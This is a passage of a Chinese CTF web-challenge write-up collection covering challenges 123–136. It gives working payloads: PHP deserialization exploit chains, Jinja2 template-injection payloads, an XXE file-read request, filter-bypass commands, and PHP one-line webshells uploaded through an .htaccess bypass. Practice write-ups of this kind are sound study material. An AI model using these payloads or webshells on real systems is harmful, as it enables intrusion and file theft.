&#125;</span><br></pre></td></tr></table></figure>

<p>&#x2F;flag.php?score&#x3D;999999</p>
<h1 id="123-UUCTF-2022-新生赛-ez-upload"><a href="#123-UUCTF-2022-新生赛-ez-upload" class="headerlink" title="123.[UUCTF 2022 新生赛]ez_upload"></a>123.[UUCTF 2022 新生赛]ez_upload</h1><p>apache的解析是从右往左解析的，上传改文件名为1.jpg.php即可</p>
<h1 id="124-极客大挑战-2020-welcome"><a href="#124-极客大挑战-2020-welcome" class="headerlink" title="124.[极客大挑战 2020]welcome"></a>124.[极客大挑战 2020]welcome</h1><p>post方法访问，数组绕过sha1比较，phpinfo的auto_prepend_file项有&#x2F;f1444aagggg.php路径，访问F12，flag在响应包头的flag项</p>
<h1 id="125-MoeCTF-2021-babyRCE"><a href="#125-MoeCTF-2021-babyRCE" class="headerlink" title="125.[MoeCTF 2021]babyRCE"></a>125.[MoeCTF 2021]babyRCE</h1><p>正则很强</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\;|[0-9]|\*|\`|\%|\&gt;|\&lt;|\&#x27;|\&quot;/i</span><br></pre></td></tr></table></figure>

<p>没有过滤<code>\</code>和<code>?</code></p>
<p>payload:<code>ca\t$&#123;IFS&#125;f?ag.php</code></p>
<h1 id="126-SWPUCTF-2022-新生赛-ez-1zpop"><a href="#126-SWPUCTF-2022-新生赛-ez-1zpop" class="headerlink" title="126.[SWPUCTF 2022 新生赛]ez_1zpop"></a>126.[SWPUCTF 2022 新生赛]ez_1zpop</h1><p><code>QNKCDZO</code>和<code>240610708</code>用来在非传参时绕过md5弱比较</p>
<p>exp:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lt</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$md51</span>=<span class="string">&#x27;QNKCDZO&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$md52</span>=<span class="string">&#x27;240610708&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$impo</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$title</span>=<span class="string">&#x27;cat /flag&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">lt</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;impo = <span class="keyword">new</span> <span class="title function_ invoke__">fin</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment"># O:2:&quot;lt&quot;:3:&#123;s:4:&quot;md51&quot;;s:7:&quot;QNKCDZO&quot;;s:4:&quot;md52&quot;;s:9:&quot;240610708&quot;;s:4:&quot;impo&quot;;O:3:&quot;fin&quot;:2:&#123;s:1:&quot;a&quot;;s:6:&quot;system&quot;;s:5:&quot;title&quot;;s:9:&quot;cat /flag&quot;;&#125;&#125;</span></span><br><span class="line"><span class="comment">#别忘了把lt后的3改成4绕过__wakeup()</span></span><br></pre></td></tr></table></figure>

<h1 id="127-HZNUCTF-2023-preliminary-flask"><a href="#127-HZNUCTF-2023-preliminary-flask" class="headerlink" title="127.[HZNUCTF 2023 preliminary]flask"></a>127.[HZNUCTF 2023 preliminary]flask</h1><p>payload需要倒序，焚靖的<code>--tamper-cmd rev</code>可以倒序，但仍然跑不出来</p>
<p><code>&#123;%for(x)in().__class__.__base__.__subclasses__()%&#125;&#123;%if'war'in(x).__name__ %&#125;&#123;&#123;x()._module.__builtins__['__import__']('os').popen('ls').read()&#125;&#125;&#123;%endif%&#125;&#123;%endfor%&#125;</code></p>
<p><code>&#123;%for(x)in().__class__.__base__.__subclasses__()%&#125;&#123;%if'war'in(x).__name__ %&#125;&#123;&#123;x()._module.__builtins__['__import__']('os').popen('env').read()&#125;&#125;&#123;%endif%&#125;&#123;%endfor%&#125;</code></p>
<p><code>&#123;% print lipsum.**globals**[‘os’].popen(‘env’).read() %&#125;</code>也可以</p>
<p>焚靖生成payload的用法：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> fenjing</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;_&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> s</span><br><span class="line">payload,_ = fenjing.exec_cmd_payload(waf, <span class="string">&quot;ls /&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>

<h1 id="128-NCTF-2019-Fake-XML-cookbook"><a href="#128-NCTF-2019-Fake-XML-cookbook" class="headerlink" title="128.[NCTF 2019]Fake XML cookbook"></a>128.[NCTF 2019]Fake XML cookbook</h1><p>POST请求体</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">        &lt;!ENTITY  file SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;file;&lt;/username&gt;</span><br><span class="line">&lt;password&gt;1&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>

<h1 id="129-UUCTF-2022-新生赛-ez-unser"><a href="#129-UUCTF-2022-新生赛-ez-unser" class="headerlink" title="129.[UUCTF 2022 新生赛]ez_unser"></a>129.[UUCTF 2022 新生赛]ez_unser</h1><p>需要注意的2个地方是</p>
<p>1、exp中也要把方法补上 否则将不会执行</p>
<p>2、由于正则不允许修改序列化成员数量绕过<code>__wakeup</code>，但可以通过赋予变量相同的地址<code>$a-&gt;b=&amp;$a-&gt;a;</code></p>
<p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">###very___so___easy!!!!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="number">1</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="number">2</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c=<span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/test&quot;:3/i&#x27;</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;你输入的不正确！！！搞什么！！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$bbb</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>第一版exp（无法执行，因为<code>__wakeup</code>和<code>__destruct</code>没有补全）：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;b=&amp;<span class="variable">$a</span>-&gt;a;</span><br><span class="line"><span class="variable">$a</span>-&gt;c=<span class="string">&quot;system(&#x27;ls&#x27;);&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<p>exp：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;b=&amp;<span class="variable">$a</span>-&gt;a;</span><br><span class="line"><span class="variable">$a</span>-&gt;c=<span class="string">&quot;system(&#x27;cat /f*&#x27;);&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="130-SWPUCTF-2022-新生赛-Ez-upload"><a href="#130-SWPUCTF-2022-新生赛-Ez-upload" class="headerlink" title="130.[SWPUCTF 2022 新生赛]Ez_upload"></a>130.[SWPUCTF 2022 新生赛]Ez_upload</h1><p>上传<code>.htaccess</code>，修改mime类型为<code>image/jpeg</code>即可</p>
<p><img src="C:\Users\17816\AppData\Roaming\Typora\typora-user-images\image-20231115141605923.png" alt="image-20231115141605923"></p>
<p>然后传马，waf是ph*和mime类型，以及&lt;?</p>
<p>所以改用<code>&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#39;cmd&#39;]);&lt;/script&gt;</code>，修改mime类型为<code>image/jpeg</code>，使用文件后缀为png(其实任意都可以，因为.htaccess已经将所有后缀的文件都解析为php了)</p>
<p><img src="C:\Users\17816\AppData\Roaming\Typora\typora-user-images\image-20231115145056553.png" alt="image-20231115145056553"></p>
<p>蚁剑连接没啥用，flag在phpinfo里</p>
<h1 id="131-FSCTF-2023-源码！启动"><a href="#131-FSCTF-2023-源码！启动" class="headerlink" title="131.[FSCTF 2023]源码！启动!"></a>131.[FSCTF 2023]源码！启动!</h1><p>F12被禁用，ctrl+U在最下面getflag</p>
<h1 id="132-SWPUCTF-2022-新生赛-funny-web"><a href="#132-SWPUCTF-2022-新生赛-funny-web" class="headerlink" title="132.[SWPUCTF 2022 新生赛]funny_web"></a>132.[SWPUCTF 2022 新生赛]funny_web</h1><p>username&#x3D;NSS</p>
<p>password&#x3D;2122693401</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#rea11y.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$num</span> != <span class="string">&#x27;12345&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>) == <span class="string">&#x27;12345&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;这为何相等又不相等&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>?num=12345a</code></p>
<h1 id="133-MoeCTF-2021-Web安全入门指北—GET"><a href="#133-MoeCTF-2021-Web安全入门指北—GET" class="headerlink" title="133.[MoeCTF 2021]Web安全入门指北—GET"></a>133.[MoeCTF 2021]Web安全入门指北—GET</h1><p><code>?moe=flag</code></p>
<h1 id="134-MoeCTF-2021-unserialize"><a href="#134-MoeCTF-2021-unserialize" class="headerlink" title="134.[MoeCTF 2021]unserialize"></a>134.[MoeCTF 2021]unserialize</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">entrance</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$start</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;start = <span class="variable">$start</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;start-&gt;<span class="title function_ invoke__">helloworld</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">springboard</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$middle</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;middle-&gt;hs;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$end</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$end</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;end = <span class="variable">$end</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$Attribute</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;end);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;serialize&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;serialize&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>链子分析：变量命名的逻辑已经很清晰了，<code>start-&gt;middle-&gt;end</code>，最终在end的<code>__get</code>里执行代码，往上推，需要控制evil类的end成员为我们要的命令执行函数如<code>system(&#39;cat /flag&#39;);</code>，再往上推，就需要调用<code>__construct</code>，而在实例化的时候会调用，默认不用处理，为了调用<code>__get</code>，需要访问不存在的属性，正好sprintboard类的<code>__call</code>方法访问了一个<code>hs</code>，而调用<code>__call</code>方法就需要访问不存在的方法，正好entrance里的<code>__destruct</code>就访问了一个不存在的<code>helloword()</code>，尝试写下exp：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">entrance</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$start</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;start = <span class="variable">$start</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;start-&gt;<span class="title function_ invoke__">helloworld</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">springboard</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$middle</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;middle-&gt;hs;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$end</span> = <span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$end</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;end = <span class="variable">$end</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$Attribute</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;end);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">entrance</span>(<span class="variable">$start</span>=<span class="keyword">new</span> <span class="title function_ invoke__">springboard</span>());</span><br><span class="line"><span class="variable">$a</span>-&gt;start-&gt;middle = <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>(<span class="variable">$end</span>=<span class="string">&quot;system(&#x27;cat /*&#x27;);&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">#O:8:&quot;entrance&quot;:1:&#123;s:5:&quot;start&quot;;O:11:&quot;springboard&quot;:1:&#123;s:6:&quot;middle&quot;;O:4:&quot;evil&quot;:1:&#123;s:3:&quot;end&quot;;s:17:&quot;system(&#x27;cat /*&#x27;);&quot;;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="135-FSCTF-2023-webshell是啥捏"><a href="#135-FSCTF-2023-webshell是啥捏" class="headerlink" title="135.[FSCTF 2023]webshell是啥捏"></a>135.[FSCTF 2023]webshell是啥捏</h1><p><code>?👽=cat /f*</code></p>
<h1 id="136-GKCTF-2020-CheckIN"><a href="#136-GKCTF-2020-CheckIN" class="headerlink" title="136.[GKCTF 2020]CheckIN"></a>136.[GKCTF 2020]CheckIN</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;Check_In&lt;/title&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$code</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$decode</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;code = @<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">x</span>()[<span class="string">&#x27;Ginkgo&#x27;</span>];</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;decode = @<span class="title function_ invoke__">base64_decode</span>( <span class="variable">$this</span>-&gt;code );</span><br><span class="line">                @<span class="title function_ invoke__">Eval</span>(<span class="variable">$this</span>-&gt;decode);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$_REQUEST</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ClassName</span>();</span><br></pre></td></tr></table></figure>

<p>本地调试可以执行命令，靶机不行，猜测disable_fucntions</p>
<p>使用phpinfo查看禁用了一大堆系统函数，那么构造webshell语句</p>
<p><code>?Ginkgo=ZXZhbCgkX1BPU1RbJ2NtZCddKTs=</code></p>
<p>蚁剑连接，绕过disable_functions，选择模式PHP7_UserFilter</p>
<p>根目录的flag读不了，需要提权</p>
